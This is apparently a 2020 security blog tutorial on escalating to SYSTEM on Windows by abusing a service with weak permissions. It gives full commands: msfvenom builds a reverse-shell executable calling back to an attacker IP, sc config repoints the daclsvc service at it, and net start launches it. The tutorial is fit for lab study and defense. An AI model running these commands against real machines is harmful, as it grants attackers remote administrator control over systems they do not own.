---
title: Windows PrivEsc using Insecure Service Permissions
author: Udesh
date: 2020-11-04
categories: [Windows, Privilege Escalation]
tags: [Privilege Escalation]
---
## Windows PrivEsc using insecure service permissions.

This blog will cover the Windows Privilege Escalation technique using insecure service permission. This tutorial suitable when you try to exploit a machine using vulnerability by publicly available exploits and get the least privileged user and then try to escalate the admin rights.

In this scenario, the victim machine has an insecure running service **daclsvc**. You can use windows privilege escalation awesome script **WinPEAS .exe** to find out whether insecure services are running or not. I will generate a payload using msfvenom to get an active session of the least privileged user.

We need to create a payload using msfvenom. Make sure update the LHOST IP address accordingly.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```
Then, transfer the reverse.exe file to the windows machine. In my case i transfered the payload to the C:\PrivEsc directory on winodws. There are many ways you could do this. however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.
```bash
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```
![1.PNG]({{site.baseurl}}/assets/img/post/post6/1.PNG)

Now, system is ready to perform the privilege escalation attack.

First we need to check the **user** account permissions on the **daclsvc** service. I will use **SharpUp.exe** for this. 

SharpUp is the start of a C# port of** PowerUp**s privilege escalation checks. Currently, only the most common checks have been ported; no weaponization functions have yet been implemented. [https://github.com/GhostPack/SharpUp](https://github.com/GhostPack/SharpUp).

![2.PNG]({{site.baseurl}}/assets/img/post/post6/2.PNG)

You will notice that user has modifiable services **daclservice.exe**. 

Next, we need to query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):
```bash
sc qc daclsvc
```
![3.PNG]({{site.baseurl}}/assets/img/post/post6/3.PNG)

Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable we created:

```bash
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```
![4.PNG]({{site.baseurl}}/assets/img/post/post6/4.PNG)

Start a **nc**  listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges

To start the service : 
```bash
net start daclsvc
```
![5.PNG]({{site.baseurl}}/assets/img/post/post6/5.PNG)

Check the netcat listener, user is now an admin. 😎
